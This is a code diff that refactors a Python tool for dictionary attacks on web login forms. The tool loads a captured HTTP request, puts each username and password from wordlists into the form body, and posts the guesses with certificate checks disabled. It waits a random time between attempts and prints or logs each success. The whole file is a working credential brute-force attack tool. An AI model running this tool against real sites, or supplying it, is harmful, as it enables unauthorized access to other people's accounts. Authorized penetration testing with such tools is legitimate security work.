@@ -2,18 +2,37 @@
 
 
 '''
-	Usage: ./httpform-crack.py -u [url] -c [cookies] -b [body_format] -H [headers_json] -U [users_file] -P [passwords_file] -e [error_message] -m [min_wait_time] -M [max_wait_time]
+	Usage: ./httpform-crack.py \
+        -R [request] \
+        -U [users_file] \
+        -P [passwords_file] \
+        -e [error_message] \
+        -m [min_wait_time] \
+        -M [max_wait_time] \
+        -s [true | false]
 	
-	Example: ./httpform-crack.py -u http://testphp.vulnweb.com/userinfo.php -U users.txt -P pass.txt -b "uname=^USER^&pass=^PASS^" -H {\"Content-Type\":\"application/x-www-form-urlencoded\"} -e "please enter your login information below" -m 0 -M 1
+	Example: ./httpform-crack.py \
+        -R request.txt \
+        -U users.txt \
+        -P pass.txt \
+        -e "Authentication Failed" \
+        -m 0.0 \
+        -M 1.5 \
+        -s true
 '''
 
 
+import sys
 import time
 import random
 import requests
-import json
 
 from argparse import ArgumentParser
+
+
+config = {}
+
+request = {}
 
 
 def config_from_cmdline():
@@ -22,114 +41,199 @@ def config_from_cmdline():
 
     parser = ArgumentParser()
 
-    parser.add_argument("-b", "--bodyfmt", type=str)
-    parser.add_argument("-c", "--cookies", type=str)
-    parser.add_argument("-e", "--errormsg", type=str)
-    parser.add_argument("-H", "--header", type=str)
-    parser.add_argument("-m", "--minwait", type=str)
-    parser.add_argument("-M", "--maxwait", type=str)
-    parser.add_argument("-P", "--passwords", type=str)
-    parser.add_argument("-u", "--url", type=str)
+    parser.add_argument("-R", "--request", type=str)
     parser.add_argument("-U", "--users", type=str)
+    parser.add_argument("-P", "--passwords", type=str)
+    parser.add_argument("-s", "--secure", type=str, default="false")
+    parser.add_argument("-e", "--errormsg", type=str)
+    parser.add_argument("-m", "--minwait", type=float, default=.0)
+    parser.add_argument("-M", "--maxwait", type=float, default=.0)
+    parser.add_argument("-o", "--out", type=str)
 
     args = parser.parse_args()
 
-    config["bodyfmt"] = args.bodyfmt
-    config["cookies"] = args.cookies
+    config["request_file"] = args.request
+    config["users_file"] = args.users
+    config["passwords_file"] = args.passwords
+    config["secure_http"] = True if args.secure == "true" else False
     config["error_msg"] = args.errormsg
-    config["header"] = args.header
     config["min_wait"] = float(args.minwait)
     config["max_wait"] = float(args.maxwait)
-    config["passwords_file"] = args.passwords
-    config["url"] = args.url
-    config["users_file"] = args.users
+    config["out_file"] = args.out
 
     return config
 
 
-def cookies_cmdln_to_json(cookiesCmdln):
+def headers_to_dict(headers: "str") -> "dict":
+    headersDict = {}
+
+    headers = headers.split("\n")
+
+    method, path, protocol = headers[0].split(" ")
+
+    headersDict["Method"] = method.strip()
+    headersDict["Path"] = path.strip()
+    headersDict["Protocol"] = protocol.strip()
+
+    for h in headers[1:]:
+        name, value = h.split(":", maxsplit=1)
+
+        name = name.strip()
+        value = value.strip()
+
+        headersDict[name] = value
+    
+    if "Cookie" in headersDict:
+        headersDict["Cookie"] = cookies_to_dict(headersDict["Cookie"])
+    else:
+        headersDict["Cookie"] = ""
+
+    return headersDict
+
+
+def request_to_dict(request: "str") -> "dict":
+    requestDict = {}
+
+    headers, body = request.split("\n\n")
+
+    requestDict["headers"] = headers_to_dict(headers)
+    requestDict["body"] = body
+
+    return requestDict
+    
+
+def cookies_to_dict(cookies: "str") -> "dict":
+    cookiesDict = {}
    
-    cookiesJson = {}
-   
-    if cookiesCmdln:
+    for cookie in cookies.split(" "):
+        key, value = cookie.split("=")
 
-	    for cookie in cookiesCmdln.split(" "):
-	     
-	        key, value = cookie.split("=")
+        if value[len(value) - 1] == ";":
+            value = value[:len(value) - 1]
+        
+        cookiesDict[key] = value
 	
-	        value = value[:len(value) - 1] if value[len(value) - 1] == ";" else value
-	        
-	        cookiesJson[key] = value
-	
-    return cookiesJson
+    return cookiesDict
 
 
-def file_to_list(fileName):
-
+def file_to_list(fileName: "str") -> "dict":
     lines = []
 
     with open(fileName) as file:
-
         for line in file:
             lines.append(line.strip())
 
     return lines
 
 
-def main():
-
-   config = config_from_cmdline()
-   
-   USERS_FILE = config["users_file"]
-   
-   PASSWORDS_FILE = config["passwords_file"]
-   
-   URL = config["url"]
-   
-   COOKIES = cookies_cmdln_to_json(config["cookies"])
-   
-   HEADERS = json.loads(config["header"])
-   
-   BODY = config["bodyfmt"]
-
-   ERROR_MSG = config["error_msg"]
-
-   MIN_WAIT = config["min_wait"]
-
-   MAX_WAIT = config["max_wait"]
-   
-   users = file_to_list(USERS_FILE)
-   
-   passwords = file_to_list(PASSWORDS_FILE)
-   
-   attempts = 0
-
-   for user in users:
-   
-       for passwd in passwords:
+def get_request() -> "dict":
+    requestFile = config["request_file"]
+    request = None
+    
+    with open(requestFile, "r") as rf:
+        request = rf.read()
+        request = request_to_dict(request)
        
-           data = BODY.replace("^USER^", user).replace("^PASS^", passwd)
-           
-           response = requests.post(
-               url=URL, 
-               headers=HEADERS, 
-               data=data,
-               cookies=COOKIES
-           )
-           
-           if ERROR_MSG not in response.text:
-              print(f"[{attempts}] \033[92mACERTO User: {user} Password: {passwd} Status: {response.status_code}\033[0m")
-           else:
-              print(f"[{attempts}] \033[91mERRO User: {user} Password: {passwd} Status: {response.status_code}\033[0m")
+    return request
 
-           waitTime = random.uniform(MIN_WAIT, MAX_WAIT)
 
-           time.sleep(waitTime)
+def get_users() -> "list":
+    usersFile = config["users_file"]
+    users = file_to_list(usersFile)
+    
+    return users
 
-           attempts += 1
+
+def get_passwords() -> "list":
+    passwordsFile = config["passwords_file"]
+    passwords = file_to_list(passwordsFile)
+    
+    return passwords
+
+
+def get_url() -> "str":
+    protocol = "https" if config["secure_http"] else "http"
+    host = request["headers"]["Host"]
+    path = request["headers"]["Path"]
+    
+    url = f"{protocol}://{host}{path}"
+    
+    return url
+
+
+def try_crack(user: "str", password: "str"):
+    headers = request["headers"]
+    url = request["url"]
+    
+    cookies = headers["Cookie"]
+    
+    body = request["body"].replace("^USER^", user).replace("^PASS^", password)
+    
+    result = False
+    response = None
+    
+    try:
+        response = requests.post(
+            url=url, 
+            headers=headers, 
+            data=body,
+            cookies=cookies,
+            verify=False
+        )
+    
+        result = config["error_msg"] not in response.text
+    except UnicodeEncodeError as ue:
+        pass
+    
+    return (result, response)
+
+
+def dictionary_crack(users: "list", passwords: "list"):
+    if config["out_file"]:
+        outFile = open(config["out_file"], "a")
+    
+    attempts = 0
+
+    for user in users:
+        for password in passwords:
+            result, response = try_crack(user, password)
+
+            if response is not None:
+                if result is True:
+                    log = f"[{attempts}] \033[92mACERTO User: {user} Password: {password} Status: {response.status_code}\033[0m"
+                else:
+                    log = f"[{attempts}] \033[91mERRO User: {user} Password: {password} Status: {response.status_code}\033[0m"
+                    
+                if config["out_file"]:
+                    outFile.write(log)
+                    
+                print(log)
+
+                waitTime = random.uniform(config["min_wait"], config["max_wait"])
+
+                time.sleep(waitTime)
+
+            attempts += 1
+
+
+def main():
+    global config
+    global  request 
+        
+    config = config_from_cmdline()
+    
+    request = get_request()
+    request["url"] = get_url()
+
+    users = get_users()
+    passwords = get_passwords()
+    
+    requests.packages.urllib3.disable_warnings()
+    dictionary_crack(users, passwords)
 
 
 if __name__ == "__main__":
-
-	main()
-
+    try:
+        main()
+    except KeyboardInterrupt as ki:
+        sys.exit(0)
